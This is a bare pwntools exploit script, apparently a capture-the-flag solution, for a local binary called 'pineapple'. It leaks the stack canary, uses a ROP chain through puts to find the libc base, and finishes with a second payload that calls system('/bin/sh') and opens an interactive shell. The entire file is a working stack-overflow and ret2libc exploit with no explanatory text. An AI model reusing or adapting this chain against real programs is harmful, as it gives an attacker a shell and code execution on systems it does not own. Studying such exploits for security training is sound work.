#!/usr/bin/env python3
from pwn import *

exe  = ELF('./pineapple')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop  = ROP(exe)
context.binary    = exe
context.log_level = 'info'

io = process(exe.path)

def pop_rdi_ret():
    g = rop.find_gadget(['pop rdi', 'ret'])
    if g: 
        return g[0]                
    try:
        return next(exe.search(b'\x5f\xc3'))
    except StopIteration:
        return None                 
    
pop_rdi = pop_rdi_ret()

csu_pop  = exe.symbols['__libc_csu_init'] + 96   
csu_call = exe.symbols['__libc_csu_init'] + 64   

io.recvuntil(b"puts@GLIBC leak:")
io.recvline()

io.recvuntil(b"[1] Leak stack")
io.send(b"\n")
leak   = io.recvn(0x100)
canary = u64(leak[0x40:0x48])
log.success(f"canary = {hex(canary)}")

if pop_rdi:
    payload1 = flat(
        b'A'*0x40, canary, b'B'*8,
        pop_rdi, exe.got['puts'],
        exe.plt['puts'],
        exe.symbols['portal']
    ).ljust(0x400, b'\0')
else:
    payload1 = flat(
        b'A'*0x40, canary, b'B'*8,
        csu_pop,
            0, 1,                
            exe.got['puts'],     
            exe.got['puts'],    
            0, 0,                
        csu_call,
        b'D'*8,                
        exe.symbols['portal']
    ).ljust(0x400, b'\0')

io.recvuntil(b"[2] Send ROP payload:")
io.send(payload1)

libc_puts  = u64(io.recvline().strip().ljust(8, b'\0'))
libc.address = libc_puts - libc.symbols['puts']
log.success(f"libc base = {hex(libc.address)}")

pop_rdi_libc = (ROP(libc).find_gadget(['pop rdi','ret']) or [next(libc.search(b'\x5f\xc3'))])[0]
payload2 = flat(
    b'A'*0x40, canary, b'B'*8,
    pop_rdi_libc, next(libc.search(b"/bin/sh")),
    libc.symbols['system']
).ljust(0x400, b'\0')

io.send(payload2)
io.interactive()
